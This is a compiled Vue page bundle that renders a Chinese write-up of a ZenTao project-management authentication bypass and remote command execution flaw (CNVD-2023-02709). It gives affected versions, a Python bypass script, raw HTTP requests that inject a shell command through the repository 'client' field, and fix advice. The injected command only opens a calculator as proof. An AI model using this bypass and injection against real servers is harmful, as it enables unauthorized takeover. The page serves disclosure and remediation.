import{_ as t}from"./plugin-vue_export-helper-c27b6911.js";import{r as d,o as r,c as l,a as e,b as n,d as a,e as s}from"./app-58e4a7d6.js";const c={},o=s(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>禅道项目管理系统存在远程命令执行漏洞，该漏洞源于在认证过程中未正确退出程序，导致了认证绕过，并且后台中有多种执行命令的方式，攻击者可利用该漏洞在目标服务器上注入任意命令，实现未授权接管服务器。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>杭州易软共创网络科技有限公司 禅道项目管理系统 &gt;=17.4，&lt;=18.0.beta1（开源版）
杭州易软共创网络科技有限公司 禅道项目管理系统 &gt;=7.4，&lt;=8.0.beta1（企业版）
杭州易软共创网络科技有限公司 禅道项目管理系统 &gt;=3.4，&lt;=4.0.beta1（旗舰版）
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>权限绕过：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>import requests

header={
    &#39;User-Agent&#39;:&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5408.146 Safari/537.36&#39;,
}

def bypasscookie(url,session):
    target=url+&quot;/index.php?m=misc&amp;f=captcha&amp;sessionVar=user&quot;
    r=session.get(target,headers=header)
    zentaosid=r.cookies.get_dict()[&#39;zentaosid&#39;]
    print(zentaosid)

    header[&quot;Cookie&quot;]=&quot;zentaosid=&quot;+zentaosid
    resp=session.get(url+&quot;/index.php?m=my&amp;f=index&quot;,headers=header)
    if &quot;/shandao/www/index.php?m=user&amp;f=login&quot; not in resp.text:
        print(&quot;绕过登陆验证&quot;)
    else:
        print(&quot;无法绕过验证&quot;)



if __name__ == &#39;__main__&#39;:
    url=&quot;http://127.0.0.1:8081/shandao/www/&quot;
    session=requests.Session()
    bypasscookie(url,session)
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>后台RCE：</p><p>先创建Gitlab代码库,拿到repoID</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /shandao/www/index.php?m=repo&amp;f=create&amp;objectID=0&amp;tid=rmqcl0ss HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1:8081/shandao/www/index.php?m=repo&amp;f=create&amp;objectID=0&amp;tid=rmqcl0ss
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 144
Origin: http://127.0.0.1:8081
Connection: close
Cookie: lang=zh-cn; device=desktop; theme=default; tab=devops; preCaseLibID=1; lastCaseLib=1; checkedItem=; goback=%7B%22devops%22%3A%22http%3A%5C%2F%5C%2F127.0.0.1%3A8081%5C%2Fshandao%5C%2Fwww%5C%2Findex.php%3Fm%3Drepo%26f%3Dbrowse%26repoID%3D1%26branchID%3D%26objectID%3D0%26tid%3Dvwy3ton6%22%7D; zentaosid=r3094u5448167shtdrur4c7b6q; repoBranch=master; windowWidth=1453; windowHeight=844
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

product%5B%5D=1&amp;SCM=Gitlab&amp;serviceProject=wangnima&amp;name=wangnima2333&amp;path=&amp;encoding=utf-8&amp;client=&amp;account=&amp;password=&amp;encrypt=base64&amp;desc=&amp;uid=63e4a18218a68
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,10),p={href:"http://127.0.0.1:8081/shandao/www/index.php?m=repo&f=maintain&tid=rmqcl0ss%E6%9F%A5%E7%9C%8BrepoID%E5%B9%B6%E8%BF%9B%E5%85%A5%E7%BC%96%E8%BE%91",target:"_blank",rel:"noopener noreferrer"},m=s(`<div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /shandao/www/index.php?m=repo&amp;f=edit&amp;repoID=8&amp;objectID=0&amp;tid=rmqcl0ss HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1:8081/shandao/www/index.php?m=repo&amp;f=edit&amp;repoID=8&amp;objectID=0&amp;tid=rmqcl0ss
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 222
Origin: http://127.0.0.1:8081
Connection: close
Cookie: lang=zh-cn; device=desktop; theme=default; tab=devops; preCaseLibID=1; lastCaseLib=1; checkedItem=; goback=%7B%22devops%22%3A%22http%3A%5C%2F%5C%2F127.0.0.1%3A8081%5C%2Fshandao%5C%2Fwww%5C%2Findex.php%3Fm%3Drepo%26f%3Dbrowse%26repoID%3D1%26branchID%3D%26objectID%3D0%26tid%3Dvwy3ton6%22%7D; zentaosid=r3094u5448167shtdrur4c7b6q; repoBranch=master; windowWidth=1453; windowHeight=844
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

product%5B%5D=1&amp;SCM=Subversion&amp;serviceHost=&amp;name=wangnima2333&amp;path=http%3A%2F%2F123.4.5.6&amp;encoding=utf-8&amp;client=%60open+%2FSystem%2FApplications%2FCalculator.app%60&amp;account=&amp;password=&amp;encrypt=base64&amp;desc=&amp;uid=63e4a26b5fd65
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="漏洞修复" tabindex="-1"><a class="header-anchor" href="#漏洞修复" aria-hidden="true">#</a> 漏洞修复</h2>`,2),v={href:"https://www.zentao.net/book/zentaoprohelp/41.html",target:"_blank",rel:"noopener noreferrer"},u=e("li",null,"安全产品升级：部分厂商安全产品具备识别该漏洞功能，进行版本升级至最新版。",-1),h=e("li",null,"临时防护措施：可在 module/common/model.php 文件中 echo $endResponseException->getContent();后面加上 exit(); 来修复权限绕过漏洞。",-1);function b(w,g){const i=d("ExternalLinkIcon");return r(),l("div",null,[o,e("p",null,[n("创建好后，去到 "),e("a",p,[n("http://127.0.0.1:8081/shandao/www/index.php?m=repo&f=maintain&tid=rmqcl0ss查看repoID并进入编辑"),a(i)])]),m,e("ol",null,[e("li",null,[n("进行官方升级："),e("a",v,[n("https://www.zentao.net/book/zentaoprohelp/41.html"),a(i)])]),u,h])])}const f=t(c,[["render",b],["__file","禅道 项目管理系统远程命令执行漏洞 CNVD-2023-02709.html.vue"]]);export{f as default};
